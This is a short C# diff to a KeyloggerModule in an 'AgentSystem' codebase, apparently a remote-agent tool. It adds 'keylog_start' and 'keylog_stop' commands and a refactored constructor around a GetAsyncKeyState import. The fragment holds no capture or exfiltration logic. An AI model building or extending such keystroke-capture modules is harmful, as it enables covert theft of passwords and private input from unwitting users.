@@ -7,6 +7,7 @@ using System.Text.Json;
 using System.Threading;
 using AgentSystem.Core;
 using Timer = System.Threading.Timer;
+using AgentSystem.Managers;
 
 namespace AgentSystem.Modules
 {
@@ -51,7 +52,9 @@ namespace AgentSystem.Modules
         [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
         private static extern short GetAsyncKeyState(int keyCode);
 
-        public KeyloggerModule(AgentClient context) : base(context)
+        public override string[] SupportedCommands => new[] { "keylog_start", "keylog_stop" };
+        public KeyloggerModule(IAgentContext context, SecurityManager security, UIManager ui) 
+            : base(context, security, ui)
         {
             hookProc = HookCallback; // Khởi tạo delegate
         }
